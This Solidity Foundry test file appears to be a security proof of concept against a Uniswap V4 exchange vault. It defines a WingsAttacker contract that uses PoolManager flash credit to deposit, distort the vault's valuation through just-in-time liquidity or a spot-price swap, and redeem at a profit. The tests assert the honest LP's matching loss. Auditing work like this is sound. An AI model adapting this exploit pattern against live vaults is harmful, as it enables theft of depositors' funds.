// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4UpperLowerWingsStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/test/bases/TestBase_UniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVault as IWings} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance as Rebalance} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor as Actor} from
    "test/foundry/spec/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/reference/UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {ModifyLiquidityParams, SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TransientStateLibrary.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultLiquidationQuote as Q} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultLiquidationQuote.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";

/// @notice Unprivileged attacker. All capital is PoolManager flash credit (take/settle) inside one unlock.
contract WingsAttacker is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;
    IPoolManager immutable manager;
    IWings immutable vault;
    PoolKey key;
    IERC20 immutable t0;
    IERC20 immutable t1;

    // mode 0: JIT depth.  mode 1: spot price push.
    uint8 mode;
    uint256 dep;
    uint256 param; // JIT liquidity, or swap amount (token1 in)
    uint160 restorePrice;

    uint256 public minted;
    uint256 public paid;
    uint256 public valueAtDeposit;
    uint256 public valueAtRedeem;

    constructor(IPoolManager m, IWings v, PoolKey memory k) {
        manager = m; vault = v; key = k;
        t0 = IERC20(Currency.unwrap(k.currency0));
        t1 = IERC20(Currency.unwrap(k.currency1));
        t0.approve(address(v), type(uint256).max);
    }

    function attack(uint8 mode_, uint256 dep_, uint256 param_, uint160 restore_) external {
        mode = mode_; dep = dep_; param = param_; restorePrice = restore_;
        manager.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(manager), "pm");
        // flash principal from the PoolManager
        manager.take(key.currency0, address(this), dep);
        if (mode == 1) {
            // push price up (sell token1 for token0): token1 inventory worth less in token0
            manager.swap(key, SwapParams(false, -int256(param), _maxP()), "");
        }
        valueAtDeposit = vault.liquidationValue().value;minted = IStandardExchangeIn(address(vault)).exchangeIn(t0, dep, IERC20(address(vault)), 0, address(this), false, block.timestamp);
        if (mode == 0) {
            if (param != 0) manager.modifyLiquidity(key, ModifyLiquidityParams(-887220, 887220, int256(param), bytes32(uint256(7))), "");
        } else {
            // swap back to the original price
            manager.swap(key, SwapParams(true, -int256(type(int128).max), restorePrice), "");
        }
        valueAtRedeem = vault.liquidationValue().value;paid = IStandardExchangeIn(address(vault)).exchangeIn(IERC20(address(vault)), minted, t0, 0, address(this), false, block.timestamp);
        if (mode == 0 && param != 0) {
            manager.modifyLiquidity(key, ModifyLiquidityParams(-887220, 887220, -int256(param), bytes32(uint256(7))), "");
        }
        _settle(key.currency0);
        _settle(key.currency1);
        return "";
    }

    function _maxP() private pure returns (uint160) { return 1461446703485210103287273052203988822378723970342 - 1; }

    function _settle(Currency c) private {
        int256 d = manager.currencyDelta(address(this), c);
        if (d < 0) {
            manager.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(manager), uint256(-d));
            manager.settle();
        } else if (d > 0) {
            manager.take(c, address(this), uint256(d));
        }
    }
}

contract WingsSpotNavTestProd0 is TestBase_UniswapV4UpperLowerWingsStandardExchangeVault {
    using StateLibrary for IPoolManager;

    Actor externalLp;
    address honest = address(0xB0B);
    uint256 constant HONEST = 1e12;

    function _build(uint128 extL) internal {
        vm.prank(owner); indexedexManager.setDefaultLiquidReservePercentage(0);
        externalLp = Actor(create3Factory.create3WithArgs(type(Actor).creationCode, abi.encode(pool, address(this)), keccak256("apex.extlp")));
        token0.mint(address(externalLp), 1e30); token1.mint(address(externalLp), 1e30);
        if (extL != 0) externalLp.modify(key, -887220, 887220, int256(uint256(extL)), bytes32(0));
        // honest LP deposits normally
        token0.mint(honest, HONEST);
        vm.startPrank(honest);
        token0.approve(address(wings0), type(uint256).max);IStandardExchangeIn(address(wings0)).exchangeIn(token0, HONEST, IERC20(address(wings0)), 0, honest, false, block.timestamp);
        vm.stopPrank();
        // permissionless keeper rebalances until no more progress / loss budget reached
        for (uint256 i; i < 12; ++i) {
            try Rebalance(address(wings0)).rebalance(0, block.timestamp) returns (uint256) {} catch { break; }
        }
    }

    function _honestValue() internal view returns (uint256) {
        uint256 s = IERC20(address(wings0)).totalSupply();
        return FullMath.mulDiv(IERC20(address(wings0)).balanceOf(honest), wings0.liquidationValue().value, s);
    }

    /// value of vault holdings (local + positions principal+fees) at SPOT price, in token0 raw units
    function _markValue() internal view returns (uint256) {
        Q.Result memory r = wings0.liquidationValue();
        (uint160 p,,,) = pool.getSlot0(key.toId());
        // r.value already = token0 total + proceeds; recompute mark: token0 part = value - proceeds; token1 total = sold + unsold
        uint256 t1amt = r.sold + r.unsold;
        uint256 t1in0 = FullMath.mulDiv(FullMath.mulDiv(t1amt, 1 << 96, p), 1 << 96, p);
        return r.value - r.proceeds + t1in0;
    }

    function _log(string memory tag) internal view {
        Q.Result memory r = wings0.liquidationValue();
        (uint256 l0, uint256 l1) = wings0.localReserves();
        (,, uint128 core,) = wings0.position(0);
        (,, uint128 up,) = wings0.position(1);
        (,, uint128 lo,) = wings0.position(2);
        console2.log(tag);
        console2.log("  liqValue", r.value, "markValue", _markValue());
        console2.log("  opposing sold", r.sold, "unsold", r.unsold);
        console2.log("  local0", l0, "local1", l1);
        console2.log("  core/upper/lower L", core, up, lo);
        console2.log("  pool active L", pool.getLiquidity(key.toId()));
    }

    function _runJit(uint128 extL, uint256 dep, uint256 jitL) internal returns (int256 profit) {
        _build(extL);
        _log("after honest deposit + rebalance");
        uint256 hBefore = _honestValue();
        uint256 markBefore = _markValue();
        uint256 sBefore = IERC20(address(wings0)).totalSupply();

        WingsAttacker a = new WingsAttacker(pool, wings0, key);
        token1.mint(address(a), 10); // rounding dust for JIT add/remove, accounted as cost
        token0.mint(address(a), 10); // rounding dust, accounted (a0 includes it)
        uint256 a0 = token0.balanceOf(address(a));
        a.attack(0, dep, jitL, 0);
        uint256 a1 = token0.balanceOf(address(a));
        uint256 t1Left = token1.balanceOf(address(a));

        profit = int256(a1) - int256(a0) - int256(10 - t1Left); // token1 dust valued 1:1 raw (price ~1)
        uint256 hAfter = _honestValue();
        uint256 markAfter = _markValue();
        _log("after attack");
        console2.log("deposit D", dep, "jit L", jitL);
        console2.log("V at deposit", a.valueAtDeposit(), "V at redeem", a.valueAtRedeem());
        console2.log("minted", a.minted(), "paid", a.paid());
        console2.log("attacker net token0 profit");
        console2.logInt(profit);
        console2.log("honest entitlement before", hBefore, "after", hAfter);
        console2.log("vault mark value before", markBefore, "after", markAfter);
        assertEq(IERC20(address(wings0)).totalSupply(), sBefore, "attacker fully exited");
        if (profit > 0) {
            assertLt(hAfter, hBefore, "honest LP entitlement dropped");
            assertApproxEqAbs(hBefore - hAfter, uint256(profit), 10, "victim loss == attacker profit");
            assertLt(markAfter, markBefore, "vault mark value dropped");
        }
        assertEq(IERC20(address(wings0)).balanceOf(address(a)), 0);
    }

    // ---------------- JIT depth variant (wings-liquidity-depth-jit) ----------------
    function test_jit_thinExternal() public {
        int256 p = _runJit(1e11, 2e11, 1e22);
        assertGt(p, 0, "attacker profit");
    }

    function test_jit_equalExternal() public {
        int256 p = _runJit(1e12, 1e12, 1e22);
        assertGt(p, 0, "attacker profit");
    }

    /// control: identical flow without the JIT liquidity -> no profit
    function test_jit_control_noJit() public {
        int256 p = _runJit(1e12, 1e12, 0);
        assertLe(p, 0, "control must not profit");
    }

    /// honest LP realizes the loss: redeem after the attack vs. redeem in an untouched world
    function test_jit_honestRealizedLoss() public {
        _build(1e12);
        uint256 snap = vm.snapshotState();
        uint256 sh = IERC20(address(wings0)).balanceOf(honest);
        vm.prank(honest);uint256 outNoAttack = IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(wings0)), sh, token0, 0, honest, false, block.timestamp);
        vm.revertToState(snap);
        WingsAttacker a = new WingsAttacker(pool, wings0, key);
        token1.mint(address(a), 10);
        a.attack(0, 1e12, 1e22, 0);
        uint256 prof = token0.balanceOf(address(a));
        vm.prank(honest);uint256 outAttack = IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(wings0)), sh, token0, 0, honest, false, block.timestamp);
        console2.log("honest redeem proceeds no-attack", outNoAttack, "after-attack", outAttack);
        console2.log("attacker token0 gained", prof);
        assertGt(prof, 0);
        assertLt(outAttack, outNoAttack, "honest LP realized loss");
    }

    function test_jit_deepExternal() public {
        int256 p = _runJit(1e13, 1e12, 1e22);
        console2.log("deep external sweep done");
        p;
    }

    // ---------------- spot price variant (wings-unlock-spot-nav) ----------------
    function _runSpot(uint128 extL, uint256 dep, uint256 swapIn) internal returns (int256 profit) {
        _build(extL);
        _log("after honest deposit + rebalance");
        (uint160 p0,,,) = pool.getSlot0(key.toId());
        uint256 hBefore = _honestValue();
        uint256 markBefore = _markValue();
        WingsAttacker a = new WingsAttacker(pool, wings0, key);
        // attacker working capital to cover round-trip swap fees (accounted as cost)
        uint256 fund0 = 1e11; uint256 fund1 = 1e11;
        token0.mint(address(a), fund0); token1.mint(address(a), fund1);
        a.attack(1, dep, swapIn, p0);
        (uint160 p1,,,) = pool.getSlot0(key.toId());
        uint256 b0 = token0.balanceOf(address(a));
        uint256 b1 = token1.balanceOf(address(a));
        // value token1 at restored spot price
        int256 d1 = int256(b1) - int256(fund1);
        int256 d1in0 = d1 >= 0 ? int256(FullMath.mulDiv(FullMath.mulDiv(uint256(d1), 1 << 96, p1), 1 << 96, p1))
                               : -int256(FullMath.mulDiv(FullMath.mulDiv(uint256(-d1), 1 << 96, p1), 1 << 96, p1));
        profit = int256(b0) - int256(fund0) + d1in0;
        _log("after attack");
        console2.log("price before/after", p0, p1);
        console2.log("V at deposit", a.valueAtDeposit(), "V at redeem", a.valueAtRedeem());
        console2.log("minted", a.minted(), "paid", a.paid());
        console2.log("attacker token0 delta / token1 delta");
        console2.logInt(int256(b0) - int256(fund0)); console2.logInt(d1);
        console2.log("attacker net profit (token0 units at restored spot)");
        console2.logInt(profit);
        console2.log("honest entitlement before", hBefore, "after", _honestValue());
        console2.log("vault mark value before", markBefore, "after", _markValue());
        assertEq(p1, p0, "price restored");
        assertEq(IERC20(address(wings0)).balanceOf(address(a)), 0, "attacker fully exited");
        assertGt(profit, 0, "attacker net profit after fees");
        assertLt(_honestValue(), hBefore, "honest entitlement dropped");
        assertLt(_markValue(), markBefore, "vault mark value dropped");
    }

    function test_spot_thinExternal() public {
        int256 p = _runSpot(1e11, 1e11, 5e10);
        assertGt(p, 0, "attacker profit");
    }

    function test_spot_equalExternal() public {
        int256 p = _runSpot(1e12, 3e11, 3e11);
        p;
    }

    // ---------------- ADJUDICATION: out-of-unlock, settled JIT depth with real (flash-loanable) capital ----------------
    // Production sleeve (0%) blocks the in-unlock variant. Here: deposit normally, add SETTLED full-range liquidity
    // in its own unlock, redeem normally (PoolManager locked -> _fund path, no sleeve cap), remove liquidity.
    Actor jitA; address atk; uint160 sp0; uint256 sMinted; uint256 sPaid; uint256 sUsed0; uint256 sUsed1; uint256 sHBefore;
    uint256 constant CAP = 1e30;
    function _settledSetup(uint128 extL, uint256 dep, uint256 jitL) internal {
        _build(extL);
        _log("after honest deposit + rebalance");
        (sp0,,,) = pool.getSlot0(key.toId());
        sHBefore = _honestValue();
        atk = makeAddr("settled jit attacker");
        jitA = Actor(create3Factory.create3WithArgs(type(Actor).creationCode, abi.encode(pool, address(this)), keccak256(abi.encode("apex.jit", jitL, dep))));
        token0.mint(address(jitA), CAP); token1.mint(address(jitA), CAP);
        token0.mint(atk, dep);
        vm.startPrank(atk);
        token0.approve(address(wings0), type(uint256).max);sMinted = IStandardExchangeIn(address(wings0)).exchangeIn(token0, dep, IERC20(address(wings0)), 0, atk, false, block.timestamp);
        vm.stopPrank();
    }
    function _settledAttack(uint256 jitL) internal {
        if (jitL != 0) jitA.modify(key, -887220, 887220, int256(jitL), bytes32(uint256(7)));
        sUsed0 = CAP - token0.balanceOf(address(jitA)); sUsed1 = CAP - token1.balanceOf(address(jitA));
        vm.prank(atk);sPaid = IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(wings0)), sMinted, token0, 0, atk, false, block.timestamp);
        if (jitL != 0) jitA.modify(key, -887220, 887220, -int256(jitL), bytes32(uint256(7)));
    }
    function _runSettledJit(uint128 extL, uint256 dep, uint256 jitL) internal {
        _settledSetup(extL, dep, jitL);
        _settledAttack(jitL);
        int256 d0 = int256(token0.balanceOf(address(jitA))) - int256(CAP) + int256(sPaid) - int256(dep);
        int256 d1 = int256(token1.balanceOf(address(jitA))) - int256(CAP);
        int256 d1in0 = d1 >= 0 ? int256(FullMath.mulDiv(FullMath.mulDiv(uint256(d1), 1 << 96, sp0), 1 << 96, sp0))
                               : -int256(FullMath.mulDiv(FullMath.mulDiv(uint256(-d1), 1 << 96, sp0), 1 << 96, sp0));
        (uint160 p1,,,) = pool.getSlot0(key.toId());
        console2.log("SETTLED-JIT deposit D", dep, "jit L", jitL);
        console2.log("  JIT capital locked token0/token1", sUsed0, sUsed1);
        console2.log("  minted", sMinted, "paid", sPaid);
        console2.log("  price p0 / p1", sp0, p1);
        console2.log("  attacker token0 delta / token1 delta (incl. JIT LP)");
        console2.logInt(d0); console2.logInt(d1);
        console2.log("  attacker net profit valued @p0 (token0 raw)");
        console2.logInt(d0 + d1in0);
        console2.log("  honest entitlement before", sHBefore, "after", _honestValue());
        assertEq(IERC20(address(wings0)).balanceOf(atk), 0);
    }

    function test_adj_settledJit_control() public { _runSettledJit(1e12, 1e12, 0); }
    function test_adj_settledJit_10x() public { _runSettledJit(1e12, 1e12, 1e13); }
    function test_adj_settledJit_100x() public { _runSettledJit(1e12, 1e12, 1e14); }
}
